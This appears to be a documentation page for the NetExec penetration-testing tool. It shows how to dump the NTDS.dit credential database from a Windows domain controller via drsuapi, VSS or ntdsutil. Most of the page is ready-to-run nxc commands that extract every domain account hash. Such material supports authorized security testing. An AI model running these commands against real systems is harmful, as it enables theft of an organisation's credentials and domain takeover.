# Dump NTDS.dit

### Dump the NTDS.dit from target DC using methods from secretsdump.py

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```bash
2 methods are available:   
(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
						additional drsuapi calls to convert the resultant linked-lists into readable format  
			vss - Uses the Volume Shadow copy Service  
```

```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
```

{% hint style="info" %}
You can also DCSYNC with the computer account of the DC
{% endhint %}

There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py&#x20;

```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
```

Remember to play this music everytime you got DA

{% embed url="https://www.youtube.com/watch?v=SyjUwhBYa6Q" %}
